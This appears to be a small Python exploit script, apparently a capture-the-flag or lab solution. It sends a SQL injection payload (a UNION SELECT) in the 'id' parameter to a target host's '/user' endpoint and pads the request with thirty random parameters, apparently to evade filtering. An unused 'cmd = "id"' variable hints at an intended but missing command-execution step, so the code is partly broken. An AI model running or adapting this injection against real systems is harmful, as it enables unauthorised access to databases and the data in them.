#!/usr/bin/env python3
import requests, sys, string, random
from urllib.parse import urljoin

HOST = sys.argv[1]
wp = lambda x: urljoin(f"http://{HOST}", x)
_s = requests.session()

cmd = "id"

base_params = {
    "".join(random.choices(string.printable, k=5)): "".join(
        random.choices(string.printable, k=10)
    )
    for _ in range(30)
}

base_params.update({"db": "mssql"})

base_params.update({"id": "0 UNION SELECT null, 2;-- -#".format(cmd)})

print(_s.get(wp("/user"), params=base_params).text)
